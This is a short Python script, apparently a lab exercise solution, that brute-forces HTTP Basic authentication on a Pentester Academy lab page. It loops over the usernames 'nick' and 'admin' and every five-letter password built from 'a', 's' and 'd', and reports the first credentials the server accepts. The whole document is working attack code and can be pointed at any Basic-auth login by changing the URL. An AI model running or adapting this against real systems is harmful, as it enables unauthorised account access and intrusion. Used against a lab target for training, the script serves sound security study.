import itertools
import requests
import base64

password=(list(map("".join, itertools.product('asd', repeat=5))))
email=['nick','admin']

for username in email:
	for passw in password:
		url='http://pentesteracademylab.appspot.com/lab/webapp/basicauth'
		attribs=username+":"+passw
		message_bytes = attribs.encode('ascii')
		base64_bytes = base64.b64encode(message_bytes)
		encoded = base64_bytes.decode('ascii')
		finalAttribs=" Basic "+str(encoded)
		params={'Authorization':finalAttribs}
		r=requests.post(url=url, headers={"Authorization": "Basic %s" % encoded})
		if ("Unauthorized" not in r.text):
			print ("Success in brute force")
			print(username)
			print(passw)
			break
